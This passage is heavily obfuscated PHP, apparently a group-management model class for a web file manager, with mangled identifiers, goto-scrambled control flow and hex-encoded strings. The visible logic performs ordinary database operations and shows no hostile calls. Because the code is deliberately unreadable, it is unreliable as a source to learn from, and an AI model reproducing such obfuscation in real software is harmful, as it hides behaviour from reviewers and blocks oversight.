$f‹èî²¿¯‡ + $CÑõ¤ ï¥) { $cù×ê†Œİö = $this->limit($f‹èî²¿¯‡, $f‹èî²¿¯‡ + $CÑõ¤ ï¥)->select(); foreach ($cù×ê†Œİö as $fİÆƒß¼µˆ) { $a£¶ô¢İŒ += $fİÆƒß¼µˆ[$f™ĞÃ‘Ö›[77]] * $fİÆƒß¼µˆ[$f™ĞÃ‘Ö›[2170]]; $CÚå—ÉÛÀ¦ += $fİÆƒß¼µˆ[$f™ĞÃ‘Ö›[77]] * ($fİÆƒß¼µˆ[$f™ĞÃ‘Ö›[2170]] - 1); $BªÇ¢¡§Ÿî += $fİÆƒß¼µˆ[$f™ĞÃ‘Ö›[2170]]; } } $BŸ‘‚‰Ó = array($f™ĞÃ‘Ö›[2175] => $a£¶ô¢İŒ, $f™ĞÃ‘Ö›[2176] => $CÚå—ÉÛÀ¦, $f™ĞÃ‘Ö›[2177] => $CÚå—ÉÛÀ¦ / $a£¶ô¢İŒ, $f™ĞÃ‘Ö›[81] => $bÈÍ“—ŒÅ÷, $f™ĞÃ‘Ö›[2178] => $BªÇ¢¡§Ÿî); return $BŸ‘‚‰Ó; goto fäªõÁİ‚; fäªõÁİ‚: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\160"; protected $tableMeta = array("\164\141\x62\154\145\x4e\141\155\x65" => "\147\x72\x6f\x75\x70\137\x6d\145\x74\141", "\x6d\145\x74\x61\106\151\x65\154\x64" => "\x67\162\157\x75\160\111\x44"); protected function cacheFunctionAlias($bÈ—‰ó•–‘) { $EÍÓ«íã…ë =& $_SERVER[³‘’¼äÑ™ÔÍ]; return array($EÍÓ«íã…ë[2179] => array($bÈ—‰ó•–‘[0], $EÍÓ«íã…ë[2180]), $EÍÓ«íã…ë[2181] => array($bÈ—‰ó•–‘[0], $EÍÓ«íã…ë[2180])); } protected function getInfo($b‹ìÄø’) { $cöã¨ƒÒ— = $this->getInfoSimple($b‹ìÄø’); if (!$cöã¨ƒÒ—) { return !1; } return $this->_listDataApplyItem($cöã¨ƒÒ—); } protected function getInfoSimple($AÆµ¡š, $dÜíçŠ‰Ö» = false) { $BĞíó“âÊ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($dÜíçŠ‰Ö») { $bÍó‡Æ¯©´ = array($BĞíó“âÊ[2113] => intval($AÆµ¡š)); $c¯ááŒéÆ˜ = $this->where($bÍó‡Æ¯©´)->find(); return is_array($c¯ááŒéÆ˜) ? $c¯ááŒéÆ˜ : array(); } return $this->cacheFunctionGet($BĞíó“âÊ[2182], $AÆµ¡š); } protected function groupAdd($BÄ‹æñÍóĞ) { goto føŸ„ÏÓ´ª; føŸ„ÏÓ´ª: $fÔáÊ£ßñØ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[461]] && isset($BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[2113]]) && $BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[2113]] == 1) { if ($d•Çê¶ïªˆ = $this->getInfoSimple($BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[2113]], !0)) { return $BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[2113]]; } } else { $d•Çê¶ïªˆ = $this->getInfoSimple($BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[461]]); if (!$d•Çê¶ïªˆ) { return !1; } } $CËç›Ğà­Æ = $fÔáÊ£ßñØ[470]; goto Cä»Ò¨ìğÜ; D¿éàŸÌßÓ: if (!empty($BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[2113]])) { $CèÈˆÖ¹‡æ[$fÔáÊ£ßñØ[2113]] = $BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[2113]]; } $a•õ°ø‰äø = $this->add($CèÈˆÖ¹‡æ); $this->setNamePinyin($a•õ°ø‰äø, $CèÈˆÖ¹‡æ[$fÔáÊ£ßñØ[28]]); goto fÎÑ‹¥…‰; Cä»Ò¨ìğÜ: if ($d•Çê¶ïªˆ[$fÔáÊ£ßñØ[459]]) { $CËç›Ğà­Æ = $d•Çê¶ïªˆ[$fÔáÊ£ßñØ[459]] . $d•Çê¶ïªˆ[$fÔáÊ£ßñØ[2113]] . $fÔáÊ£ßñØ[47]; } $CèÈˆÖ¹‡æ = array($fÔáÊ£ßñØ[386] => $this->groupNameAuto($BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[461]], $BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[28]]), $fÔáÊ£ßñØ[368] => $BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[461]], $fÔáÊ£ßñØ[525] => $CËç›Ğà­Æ, $fÔáÊ£ßñØ[2183] => $BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[2097]], $fÔáÊ£ßñØ[2184] => 0, $fÔáÊ£ßñØ[2117] => 0); if (isset($BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[2134]])) { $CèÈˆÖ¹‡æ[$fÔáÊ£ßñØ[2134]] = $BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[2134]]; } else { $a´¤¾¬‡É = $this->max($fÔáÊ£ßñØ[2134]); if (!$a´¤¾¬‡É) { $a´¤¾¬‡É = 0; } $CèÈˆÖ¹‡æ[$fÔáÊ£ßñØ[2134]] = $a´¤¾¬‡É + 1; } goto D¿éàŸÌßÓ; fÎÑ‹¥…‰: if (isset($BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[2185]])) { $this->metaSet($a•õ°ø‰äø, array($fÔáÊ£ßñØ[2185] => $BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[2185]], $fÔáÊ£ßñØ[2186] => $BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[2186]])); unset($BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[2185]]); unset($BÄ‹æñÍóĞ[$fÔáÊ£ßñØ[2186]]); } Model($fÔáÊ£ßñØ[1121])->groupRootAdd($a•õ°ø‰äø); return $a•õ°ø‰äø; goto DÙ“öø‰›; DÙ“öø‰›: } protected function groupEdit($FØÜÇ›·Õ±, $D£°„‰ÍÙÊ) { $F˜íº¼‚Ó– =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!empty($D£°„‰ÍÙÊ[$F˜íº¼‚Ó–[461]])) { $a´©«‘Ïİ“ = $this->getInfoSimple($FØÜÇ›·Õ±); $CÉÅ“ÚÁÂ = $this->getInfoSimple($D£°„‰ÍÙÊ[$F˜íº¼‚Ó–[461]]); if (!$a´©«‘Ïİ“ || !$CÉÅ“ÚÁÂ) { return !1; } if ($a´©«‘Ïİ“[$F˜íº¼‚Ó–[2113]] == $CÉÅ“ÚÁÂ[$F˜íº¼‚Ó–[2113]]) { return !1; } if ($D£°„‰ÍÙÊ[$F˜íº¼‚Ó–[461]] != $a´©«‘Ïİ“[$F˜íº¼‚Ó–[461]]) { if ($CÉÅ“ÚÁÂ[$F˜íº¼‚Ó–[459]] !== $a´©«‘Ïİ“[$F˜íº¼‚Ó–[459]] && strpos($CÉÅ“ÚÁÂ[$F˜íº¼‚Ó–[459]], $a´©«‘Ïİ“[$F˜íº¼‚Ó–[459]] . $a´©«‘Ïİ“[$F˜íº¼‚Ó–[2113]] . $F˜íº¼‚Ó–[47]) === 0) { return !1; } $D£°„‰ÍÙÊ[$F˜íº¼‚Ó–[525]] = $CÉÅ“ÚÁÂ[$F˜íº¼‚Ó–[459]] . $D£°„‰ÍÙÊ[$F˜íº¼‚Ó–[461]] . $F˜íº¼‚Ó–[47]; $this->_changeChildLevel($a´©«‘Ïİ“, $CÉÅ“ÚÁÂ); } } if (isset($D£°„‰ÍÙÊ[$F˜íº¼‚Ó–[28]])) { $this->setNamePinyin($FØÜÇ›·Õ±, $D£°„‰ÍÙÊ[$F˜íº¼‚Ó–[28]]); } if (isset($D£°„‰ÍÙÊ[$F˜íº¼‚Ó–[2185]])) { $this->metaSet($FØÜÇ›·Õ±, array($F˜íº¼‚Ó–[2185] => $D£°„‰ÍÙÊ[$F˜íº¼‚Ó–[2185]], $F˜íº¼‚Ó–[2186] => $D£°„‰ÍÙÊ[$F˜íº¼‚Ó–[2186]])); unset($D£°„‰ÍÙÊ[$F˜íº¼‚Ó–[2185]]); unset($D£°„‰ÍÙÊ[$F˜íº¼‚Ó–[2186]]); } return $this->where(array($F˜íº¼‚Ó–[2187] => $FØÜÇ›·Õ±))->save($D£°„‰ÍÙÊ); } private function _changeChildLevel($fÖ¿ø ƒÂ¬, $e¨Ïù›éªÌ, $dß‚”¤Ü·Ø = false) { goto E…•’×‡ì•; c¬˜Ë“î£è: if ($dß‚”¤Ü·Ø) { $A»¨Å‰ğÊ² = $e¨Ïù›éªÌ[$DéÔìÛ¼ÛÖ[459]] . $e¨Ïù›éªÌ[$DéÔìÛ¼ÛÖ[2113]] . $DéÔìÛ¼ÛÖ[47]; } $E“Êç®²ôà = array($DéÔìÛ¼ÛÖ[525] => array($DéÔìÛ¼ÛÖ[483], $fÖ¿ø ƒÂ¬[$DéÔìÛ¼ÛÖ[459]] . $fÖ¿ø ƒÂ¬[$DéÔìÛ¼ÛÖ[2113]] . $DéÔìÛ¼ÛÖ[484])); $aÁ÷âŞ‰ÙÍ = array($DéÔìÛ¼ÛÖ[525] => array($DéÔìÛ¼ÛÖ[534], "\162\145\x70\x6c\x61\x63\145\x28\x70\141\x72\x65\x6e\x74\x4c\145\x76\145\154\x2c\x27{$fáÓÔÈ¨Û¯}\47\x2c\47{$A»¨Å‰ğÊ²}\47\51")); goto AÑ®‘ë¡µš; E…•’×‡ì•: $DéÔìÛ¼ÛÖ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fáÓÔÈ¨Û¯ = $fÖ¿ø ƒÂ¬[$DéÔìÛ¼ÛÖ[459]] . $fÖ¿ø ƒÂ¬[$DéÔìÛ¼ÛÖ[2113]] . $DéÔìÛ¼ÛÖ[47]; $A»¨Å‰ğÊ² = $e¨Ïù›éªÌ[$DéÔìÛ¼ÛÖ[459]] . $e¨Ïù›éªÌ[$DéÔìÛ¼ÛÖ[2113]] . $DéÔìÛ¼ÛÖ[47] . $fÖ¿ø ƒÂ¬[$DéÔìÛ¼ÛÖ[2113]] . $DéÔìÛ¼ÛÖ[47]; goto c¬˜Ë“î£è; AÑ®‘ë¡µš: $this->where($E“Êç®²ôà)->data($aÁ÷âŞ‰ÙÍ)->save(); goto Fƒ—Î˜Ç«°; Fƒ—Î˜Ç«°: } public function setNamePinyin($bøïˆ Ç, $a³øçÀß±æ = false) { $BİŸè¢Ÿâ× =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$a³øçÀß±æ) { $a¿õ¿·×¨ = $this->getInfoSimple($bøïˆ Ç); $a³øçÀß±æ = $a¿õ¿·×¨[$BİŸè¢Ÿâ×[28]]; } if (!Input::check($a³øçÀß±æ, $BİŸè¢Ÿâ×[528])) { $this->metaSet($bøïˆ Ç, $BİŸè¢Ÿâ×[416], null); $this->metaSet($bøïˆ Ç, $BİŸè¢Ÿâ×[415], null); return; } $d‹ßàª›‰… = array($BİŸè¢Ÿâ×[416] => str_replace($BİŸè¢Ÿâ×[50], $BİŸè¢Ÿâ×[33], Pinyin::encode($a³øçÀß±æ)), $BİŸè¢Ÿâ×[415] => Pinyin::encode($a³øçÀß±æ, $BİŸè¢Ÿâ×[529])); $this->metaSet($bøïˆ Ç, $d‹ßàª›‰…); } protected function groupStatus($cõÃ±»È¡, $b¹‡ÕçÅ) { goto D…Ûøâ“ø¦; f´Íî¦¡ÊŒ: foreach ($Eø’ó†ê·ó as $cõÃ±»È¡) { $eÇÎªÌ³ƒŒ[] = array($dä‚ñ•İ››[2113] => $cõÃ±»È¡, $dä‚ñ•İ››[89] => $dä‚ñ•İ››[692], $dä‚ñ•İ››[359] => $b¹‡ÕçÅ); } return Model($dä‚ñ•İ››[2188])->addAll($eÇÎªÌ³ƒŒ, array(), !0); goto eÎŒ˜ Â·†; eí—Ä±À•á: if ($b¹‡ÕçÅ == $dä‚ñ•İ››[83]) { $Eø’ó†ê·ó = $this->parentLevelArray($b©ãë˜­Œ[$dä‚ñ•İ››[459]]); } else { $fÔÂ†›ØÕª = array($dä‚ñ•İ››[525] => array($dä‚ñ•İ››[483], $b©ãë˜­Œ[$dä‚ñ•İ››[459]] . $b©ãë˜­Œ[$dä‚ñ•İ››[2113]] . $dä‚ñ•İ››[484])); $Eø’ó†ê·ó = $this->where($fÔÂ†›ØÕª)->field($dä‚ñ•İ››[2113])->select(); $Eø’ó†ê·ó = array_to_keyvalue($Eø’ó†ê·ó, $dä‚ñ•İ››[33], $dä‚ñ•İ››[2113]); } $Eø’ó†ê·ó[] = $b©ãë˜­Œ[$dä‚ñ•İ››[2113]]; $eÇÎªÌ³ƒŒ = array(); goto f´Íî¦¡ÊŒ; D…Ûøâ“ø¦: $dä‚ñ•İ›› =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b©ãë˜­Œ = $this->getInfoSimple($cõÃ±»È¡); if (!$b©ãë˜­Œ) { return !1; } goto eí—Ä±À•á; eÎŒ˜ Â·†: } private function _groupStatusApply($dÈáÓÉòÖ¬, $b—Ç‹¤ñ‚) { $CÚ±Î²œ±¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($b—Ç‹¤ñ‚ == $CÚ±Î²œ±¢[83]) { $B„õ´ÙØ¸å = $this->parentLevelArray($dÈáÓÉòÖ¬[$CÚ±Î²œ±¢[459]]); } else { $dî™Š¤“„£ = array($CÚ±Î²œ±¢[525] => array($CÚ±Î²œ±¢[483], $dÈáÓÉòÖ¬[$CÚ±Î²œ±¢[459]] . $dÈáÓÉòÖ¬[$CÚ±Î²œ±¢[2113]] . $CÚ±Î²œ±¢[484])); $B„õ´ÙØ¸å = $this->where($dî™Š¤“„£)->field($CÚ±Î²œ±¢[2113])->select(); $B„õ´ÙØ¸å = array_to_keyvalue($B„õ´ÙØ¸å, $CÚ±Î²œ±¢[33], $CÚ±Î²œ±¢[2113]); } if (empty($B„õ´ÙØ¸å)) { return; } $dÊİÖÌ´¡â = array(); foreach ($B„õ´ÙØ¸å as $C‰­õí¸‹‹) { $dÊİÖÌ´¡â[] = array($CÚ±Î²œ±¢[2113] => $C‰­õí¸‹‹, $CÚ±Î²œ±¢[89] => $CÚ±Î²œ±¢[692], $CÚ±Î²œ±¢[359] => $b—Ç‹¤ñ‚); } Model($CÚ±Î²œ±¢[2188])->addAll($dÊİÖÌ´¡â, array(), !0); } protected function groupRemove($A‰‡®¸¾Ÿ) { goto D£çóá‰ù¼; EÚÕå÷¸½ñ: Model($EªÒÑà¬¬°[756])->groupRootRemove($A‰‡®¸¾Ÿ); return $this->where($e¸åãîæĞê)->delete(); goto CËÌøÓÃÁä; D£çóá‰ù¼: $EªÒÑà¬¬° =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e¸åãîæĞê = array($EªÒÑà¬¬°[2113] => $A‰‡®¸¾Ÿ); $c´Ø•Ş†á = $this->where($e¸åãîæĞê)->find(); goto E„­’¡çô–; Fô”»ÑÆèÅ: $this->where(array($EªÒÑà¬¬°[461] => $A‰‡®¸¾Ÿ))->save(array($EªÒÑà¬¬°[461] => $c´Ø•Ş†á[$EªÒÑà¬¬°[461]])); Model($EªÒÑà¬¬°[2188])->where($e¸åãîæĞê)->delete(); Model($EªÒÑà¬¬°[2189])->where($e¸åãîæĞê)->delete(); goto EÚÕå÷¸½ñ; E„­’¡çô–: if (!$c´Ø•Ş†á || $c´Ø•Ş†á[$EªÒÑà¬¬°[461]] == 0) { return !1; } $cÂ ÔÍÅÌ = $this->getInfoSimple($c´Ø•Ş†á[$EªÒÑà¬¬°[461]]); $this->_changeChildLevel($c´Ø•Ş†á, $cÂ ÔÍÅÌ, !0); goto Fô”»ÑÆèÅ; CËÌøÓÃÁä: } protected function groupSort($dà˜¶¤ßº£) { $eŞ•§Œ•¹Ù =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D”“ƒá¹à = array(); foreach ($dà˜¶¤ßº£ as $B¡‚âÂÌäò => $D‘´È³ˆ÷˜) { $D”“ƒá¹à[] = array($eŞ•§Œ•¹Ù[2113], $D‘´È³ˆ÷˜, $eŞ•§Œ•¹Ù[2134], $B¡‚âÂÌäò + 1); } $this->saveAll($D”“ƒá¹à); } public function listData() { $cùİŞæ çê = $this->_makeOrder()->selectPage(50); $this->_listDataApply($cùİŞæ çê[$_SERVER[³‘’¼äÑ™ÔÍ][354]]); return $cùİŞæ çê; } private function _makeOrder($a‹ß¬§«òÚ = '') { goto d–Ëè‹õ¦Ä; d–Ëè‹õ¦Ä: $fäë±™æÁİ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C‡ÚåïŒõ = array($fäë±™æÁİ[2113], $fäë±™æÁİ[28], $fäë±™æÁİ[2099], $fäë±™æÁİ[187]); $b›âòÒ–çë = array($fäë±™æÁİ[402] => $fäë±™æÁİ[403], $fäë±™æÁİ[404] => $fäë±™æÁİ[405]); goto dŠèÃ Šíê; e³¬„à“ë: $a‹ß¬§«òÚ = $a‹ß¬§«òÚ . "{$C©¯Ñ‰Ş§}\x20{$f­Í´Õ×¼}\54\x20\147\x72\157\x75\x70\111\x44\40\141\x73\x63"; return $this->order($a‹ß¬§«òÚ); goto c¨¯ï·åŠ÷; dŠèÃ Šíê: $C©¯Ñ‰Ş§ = Input::get($fäë±™æÁİ[407], $fäë±™æÁİ[7], $fäë±™æÁİ[2117], $C‡ÚåïŒõ); $f­Í´Õ×¼ = Input::get($fäë±™æÁİ[408], $fäë±™æÁİ[7], $fäë±™æÁİ[2190], array($fäë±™æÁİ[2190], $fäë±™æÁİ[404])); $f­Í´Õ×¼ = $b›âòÒ–çë[$f­Í´Õ×¼]; goto e³¬„à“ë; c¨¯ï·åŠ÷: } public function listChild($E‹›—‚Õ†¿) { $FÛ¼åÅ©Ü´ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eœÏ¸“¡Šä = $this->where(array($FÛ¼åÅ©Ü´[461] => $E‹›—‚Õ†¿))->_makeOrder()->selectPage(200); $this->_listDataApply($eœÏ¸“¡Šä[$FÛ¼åÅ©Ü´[354]]); return $eœÏ¸“¡Šä; } public function listByID($bˆàÃ½çæù) { $d¥õİŸÏ¶ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$bˆàÃ½çæù) { return array(); } $fôõÏŠò÷® = array($d¥õİŸÏ¶[2113] => array($d¥õİŸÏ¶[7], $bˆàÃ½çæù)); $bÎŒØ«öŠ = $this->where($fôõÏŠò÷®)->select(); $this->_listDataApply($bÎŒØ«öŠ); return $bÎŒØ«öŠ; } public function listSearch($Cƒ´ëÄ×ÜÔ) { goto Fƒ•Ş”­æÓ; DŠíö™â§Ù: if ($FÚ»¾‡àõº) { $F„»Ñ³À¶Ğ = $this->getInfoSimple($FÚ»¾‡àõº); $fñ¬Çîõ‘‰ = $F„»Ñ³À¶Ğ[$AÏÙÒê·[459]] . $FÚ»¾‡àõº . $AÏÙÒê·[484]; $dìùŒçïÂ‘ = array($dìùŒçïÂ‘, array($AÏÙÒê·[459] => array($AÏÙÒê·[755], $fñ¬Çîõ‘‰))); } $C•Ó„®ÀÇ» = $this->_makeOrder()->where($dìùŒçïÂ‘)->selectPage(20); $C•Ó„®ÀÇ» = $C•Ó„®ÀÇ» ? $C•Ó„®ÀÇ» : array(); goto dÒÙÙ³ŠÑ“; B¯›­‘·ƒ: if (!trim($a‡‰«²»‡Î)) { return !1; } $a‡‰«²»‡Î = str_replace($AÏÙÒê·[2193], $AÏÙÒê·[2194], $a‡‰«²»‡Î); $dìùŒçïÂ‘ = array($AÏÙÒê·[2113] => array($AÏÙÒê·[755], "\45{$a‡‰«²»‡Î}\x25"), $AÏÙÒê·[28] => array($AÏÙÒê·[755], "\x25{$a‡‰«²»‡Î}\x25"), $AÏÙÒê·[918] => $AÏÙÒê·[2195]); goto DŠíö™â§Ù; Fƒ•Ş”­æÓ: $AÏÙÒê· =& $_SERVER[³‘’¼äÑ™ÔÍ]; $a‡‰«²»‡Î = $Cƒ´ëÄ×ÜÔ[$AÏÙÒê·[2191]]; $FÚ»¾‡àõº = isset($Cƒ´ëÄ×ÜÔ[$AÏÙÒê·[2192]]) ? $Cƒ´ëÄ×ÜÔ[$AÏÙÒê·[2192]] : !1; goto B¯›­‘·ƒ; dÒÙÙ³ŠÑ“: if (!$C•Ó„®ÀÇ» || count($C•Ó„®ÀÇ»[$AÏÙÒê·[354]]) < 5 && Input::check($a‡‰«²»‡Î, $AÏÙÒê·[306])) { goto F¶œ½øÏ„ö; cäë£Î‚ã: $D¾ĞË”Ï‰Ÿ = array_merge($aÓÃØÙùäÛ, $dˆê¤Òªƒ, $C•Ó„®ÀÇ»[$AÏÙÒê·[354]]); $C•Ó„®ÀÇ»[$AÏÙÒê·[354]] = array_unique_by_key($D¾ĞË”Ï‰Ÿ, $AÏÙÒê·[2113]); $C•Ó„®ÀÇ»[$AÏÙÒê·[351]][$AÏÙÒê·[352]] = count($C•Ó„®ÀÇ»[$AÏÙÒê·[354]]); goto cÑ´¦Û¶»«; F¶œ½øÏ„ö: $fÙ¬ìŠÍÈÃ = $this->groupChildrenAll($FÚ»¾‡àõº); $aÓÃØÙùäÛ = $this->_searchFromMeta($AÏÙÒê·[415], $a‡‰«²»‡Î, 10, $fÙ¬ìŠÍÈÃ); $dˆê¤Òªƒ = $this->_searchFromMeta($AÏÙÒê·[416], $a‡‰«²»‡Î, 10, $fÙ¬ìŠÍÈÃ); goto cäë£Î‚ã; cÑ´¦Û¶»«: $C•Ó„®ÀÇ»[$AÏÙÒê·[351]][$AÏÙÒê·[353]] = ceil($C•Ó„®ÀÇ»[$AÏÙÒê·[351]][$AÏÙÒê·[352]] / $C•Ó„®ÀÇ»[$AÏÙÒê·[351]][$AÏÙÒê·[349]]); goto B—Ÿ‰ëğ­†; B—Ÿ‰ëğ­†: } $this->_listDataApply($C•Ó„®ÀÇ»[$AÏÙÒê·[354]]); return $C•Ó„®ÀÇ»; goto B‰¦­ëáÓù; B‰¦­ëáÓù: } protected function groupChildrenAll($E‚¬À’à¡ç) { $d¾‰•ÅŠÖ˜ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$E‚¬À’à¡ç) { return !1; } if (is_string($E‚¬À’à¡ç)) { $E‚¬À’à¡ç = array($E‚¬À’à¡ç); } $dÈí„×À« = $E‚¬À’à¡ç; foreach ($E‚¬À’à¡ç as $bÏØÛŠ…Â) { $A«Ò‰—„›ƒ = $this->getInfoSimple($bÏØÛŠ…Â); $c®‚çÂĞ = array($d¾‰•ÅŠÖ˜[459] => array($d¾‰•ÅŠÖ˜[755], $A«Ò‰—„›ƒ[$d¾‰•ÅŠÖ˜[459]] . $bÏØÛŠ…Â . $d¾‰•ÅŠÖ˜[484])); $fø¢ÔŸŠÆ× = $this->field($d¾‰•ÅŠÖ˜[2113])->where($c®‚çÂĞ)->select(); $dÈí„×À« = array_merge($dÈí„×À«, array_to_keyvalue($fø¢ÔŸŠÆ×, $d¾‰•ÅŠÖ˜[33], $d¾‰•ÅŠÖ˜[2113])); } return array_unique($dÈí„×À«); } private function _searchFromMeta($a°õØÉïŒŸ, $Bİå¯”õ, $aÙ‘èÛ‡õ, $dÖ·¦­ìàç) { goto aªí¤ÄŠÊÀ; e²âÜ…Ãó: if ($dÖ·¦­ìàç) { $E¿àõÄ™ñğ[$A¾ÀÉÉÑ‹[2113]] = array($A¾ÀÉÉÑ‹[7], $dÖ·¦­ìàç); } $eÆƒØ‘‰‘ª = Model($A¾ÀÉÉÑ‹[2196])->where($E¿àõÄ™ñğ)->limit($aÙ‘èÛ‡õ)->select(); if (!$eÆƒØ‘‰‘ª) { return array(); } goto B®Òå•Ò´î; aªí¤ÄŠÊÀ: $A¾ÀÉÉÑ‹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Bİå¯”õ = strtolower($Bİå¯”õ); $E¿àõÄ™ñğ = array($A¾ÀÉÉÑ‹[89] => $a°õØÉïŒŸ, $A¾ÀÉÉÑ‹[359] => array($A¾ÀÉÉÑ‹[755], "\45{$Bİå¯”õ}\45")); goto e²âÜ…Ãó; B®Òå•Ò´î: $eÆƒØ‘‰‘ª = array_to_keyvalue($eÆƒØ‘‰‘ª, $A¾ÀÉÉÑ‹[33], $A¾ÀÉÉÑ‹[2113]); $eë«¹ŒâÙ = $this->where(array($A¾ÀÉÉÑ‹[2187] => array($A¾ÀÉÉÑ‹[7], $eÆƒØ‘‰‘ª)))->select(); if (!$eë«¹ŒâÙ) { return array(); } goto AÊ‚çøËºÀ; AÊ‚çøËºÀ: return $eë«¹ŒâÙ; goto E¿ÓŠÓÓù; E¿ÓŠÓÓù: } protected function _listDataApplyItem($BÎÄŒİË™…) { $aàŠ ŠğÏ™ = array($BÎÄŒİË™…); $this->_listDataApply($aàŠ ŠğÏ™); return $aàŠ ŠğÏ™[0]; } protected function _listDataApply(&$E¦Ò­Ûõø) { goto F†æÏª––; F°½‡Œ”á²: $this->_listAppendChildren($E¦Ò­Ûõø); $this->_listAppendChildrenMember($E¦Ò­Ûõø); $this->_listAppendMeta($E¦Ò­Ûõø, $dÅÂ’ÂĞÁ); goto F«¸¾ßÔ™; F«¸¾ßÔ™: $this->_listAppendParent($E¦Ò­Ûõø); $this->_listAppendSourceRoot($E¦Ò­Ûõø, $dÅÂ’ÂĞÁ); goto eºâÁ«øéæ; F†æÏª––: $dÒà’š‹è =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$E¦Ò­Ûõø) { return; } $dÅÂ’ÂĞÁ = array_to_keyvalue($E¦Ò­Ûõø, $dÒà’š‹è[33], $dÒà’š‹è[2113]); goto F°½‡Œ”á²; eºâÁ«øéæ: } private function _listAppendChildren(&$Aï¶’•ÕÁà) { goto dÆî’“ôã×; dÆî’“ôã×: $Eâ¿”…È =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e‚ìÈ Úó× = $Eâ¿”…È[361]; $f³¢•×­¬Â = array(); goto bá´ƒñ•â; bò”§ŒÒ«æ: $f³¢•×­¬Â = array_to_keyvalue($f³¢•×­¬Â, $Eâ¿”…È[450]); foreach ($Aï¶’•ÕÁà as &$F‹İÙÆºØ) { $F‹İÙÆºØ[$Eâ¿”…È[2197]] = isset($f³¢•×­¬Â[$F‹İÙÆºØ[$Eâ¿”…È[2113]] . $Eâ¿”…È[2198]]); } goto e¼°Èì„˜†; bá´ƒñ•â: $C×¼‘Ñµœ‡ = count($Aï¶’•ÕÁà); $AÇˆÒøìĞ© = $this->tablePrefix . $this->tableName; for ($E»ÇÊçÖ‰” = 0, $aÄˆÇãê×± = 0; $E»ÇÊçÖ‰” < $C×¼‘Ñµœ‡; $E»ÇÊçÖ‰”++) { $aÄˆÇãê×±++; $c¨²ºÚîä— = $Aï¶’•ÕÁà[$E»ÇÊçÖ‰”][$Eâ¿”…È[2113]]; $e‚ìÈ Úó× .= "\123\105\x4c\105\x43\124\40\52\40\106\x52\117\x4d\40\50\123\x45\114\105\x43\x54\40\47{$c¨²ºÚîä—}\137\x63\150\x69\x6c\x64\x27\40\x61\x73\40\x68\x61\163\x20\106\122\x4f\x4d\x20\140{$AÇˆÒøìĞ©}\x60\x20\x77\x68\x65\x72\x65\40\x70\x61\162\145\x6e\164\111\104\x3d{$c¨²ºÚîä—}\40\154\151\x6d\x69\164\x20\x31\51\x20\141\x73\40\164\142\x5f{$c¨²ºÚîä—}\x20\x75\x6e\151\157\156\40\141\154\154\40"; if (($aÄˆÇãê×± >= 20 || $E»ÇÊçÖ‰” == $C×¼‘Ñµœ‡ - 1) && $e‚ìÈ Úó×) { $e‚ìÈ Úó× = substr($e‚ìÈ Úó×, 0, -strlen($Eâ¿”…È[449])); $eŒéšºÎß = $this->query($e‚ìÈ Úó×); $f³¢•×­¬Â = array_merge($f³¢•×­¬Â, $eŒéšºÎß); $aÄˆÇãê×± = 0; $e‚ìÈ Úó× = $Eâ¿”…È[33]; } } goto bò”§ŒÒ«æ; e¼°Èì„˜†: } private function _listAppendChildrenMember(&$EÇéè¦ÀçÇ) { goto B¡™“ñÆ´ö; B¡™“ñÆ´ö: $DôÓÑíÄ½° =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bêëÙÉƒˆ = $DôÓÑíÄ½°[361]; $CÂÇ…¶Ä…ƒ = array(); goto CƒíÖ÷“ù; CƒíÖ÷“ù: $DŒõõ®îäÑ = count($EÇéè¦ÀçÇ); $B¨†µØ„§Ã = $this->tablePrefix . $DôÓÑíÄ½°[2189]; for ($bÇø· öù° = 0, $b×´à­æšŞ = 0; $bÇø· öù° < $DŒõõ®îäÑ; $bÇø· öù°++) { $b×´à­æšŞ++; $B¨ÑµÂ„š = $EÇéè¦ÀçÇ[$bÇø· öù°][$DôÓÑíÄ½°[2113]]; $bêëÙÉƒˆ .= "\x53\105\114\105\103\x54\x20\x2a\40\106\x52\117\x4d\40\50\123\x45\x4c\105\x43\x54\x20\x27{$B¨ÑµÂ„š}\x5f\x63\150\151\x6c\x64\47\x20\x61\163\40\x68\x61\163\x20\x46\x52\x4f\115\40\x60{$B¨†µØ„§Ã}\140\x20\x77\150\145\162\x65\40\147\x72\157\165\160\x49\104\75{$B¨ÑµÂ„š}\40\x6c\151\155\151\164\x20\x31\51\40\x61\x73\x20\164\x62\x5f{$B¨ÑµÂ„š}\40\165\x6e\x69\x6f\x6e\x20\141\154\154\x20"; if (($b×´à­æšŞ >= 20 || $bÇø· öù° == $DŒõõ®îäÑ - 1) && $bêëÙÉƒˆ) { $bêëÙÉƒˆ = substr($bêëÙÉƒˆ, 0, -strlen($DôÓÑíÄ½°[449])); $DØµÇŒ†Ğö = $this->query($bêëÙÉƒˆ); 